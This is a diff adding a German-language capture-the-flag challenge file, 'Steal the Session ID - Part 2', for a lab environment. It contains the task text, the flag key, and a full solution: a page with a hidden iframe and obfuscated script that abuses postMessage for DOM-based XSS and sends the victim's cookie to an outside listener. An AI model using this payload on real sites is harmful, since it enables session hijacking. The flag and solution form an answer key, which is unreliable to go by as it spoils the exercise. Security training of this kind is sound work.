@@ -1,0 +1,28 @@
+---
+:description: |
+ Verschaffe dir mittels Dom-based Cross-Site Scripting Zugang zum CloneCloud Account (http://clonecloud.mgmsp-lab.com) eines anderen Users.
+ Nutze dazu eine Schwachstelle aus, die du in der Kommunikation zwischen dem Dashboard (http://dashboard.mgmsp-lab.com) und der Cloud findest.
+ 
+ Hinweis: Es gibt neugierige User, die sich alle Homepages auf http://myhomepage.mgmsp-lab.com anschauen.
+ Die Lösung steht in einer Datei in der Cloud.
+:category: "XSS"
+:name: "Steal the Session ID - Part 2"
+:value: 100
+:keys:
+  - "Diese Cloud hat keinen Virenschutz!"
+:solutions:
+  - |
+    <h1>Attackers place</h1>
+    Thank you for your cooperation!
+    <iframe style='border: none;width:0; height:0' src='http://clonecloud.example.org/view.cgi'></iframe>
+
+    <script>
+      var script      = String.fromCharCode(60,     115, 99, 114, 105, 112, 116, 62);
+      var scriptclose = String.fromCharCode(60, 47, 115, 99, 114, 105, 112, 116, 62);
+      var payload = 'document.write("<img src=\'http://127.0.0.1:8080/"+document.cookie+"\' />")';
+      $(document).ready(function(){
+        window.setTimeout(function(){
+          $("iframe")[0].contentWindow.postMessage("'/>"+script+payload+scriptclose+"<div id='comment","*");
+        },1000);
+      });
+    </script>
